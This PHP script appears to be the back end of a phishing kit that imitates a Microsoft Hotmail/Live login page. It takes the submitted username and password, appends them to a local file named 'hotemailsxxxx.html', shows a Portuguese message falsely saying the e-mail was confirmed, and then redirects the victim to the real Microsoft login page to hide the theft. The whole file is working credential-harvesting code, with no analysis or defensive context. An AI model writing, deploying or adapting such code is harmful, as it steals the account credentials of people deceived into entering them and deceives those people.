<?php
$username=$_POST['loginfmt'];
$password=$_POST['passwd'];




$conteudos = $username.";".$password."<br>";


$fp = fopen("hotemailsxxxx.html", "a+");
$escreve = fwrite($fp, $conteudos);
fclose($fp);
	
	echo "<script>window.alert('O seu e-mail foi confirmado com sucesso!')</script>";
	
	?>

<meta http-equiv='refresh' content='1;url=https://login.live.com/login.srf'>


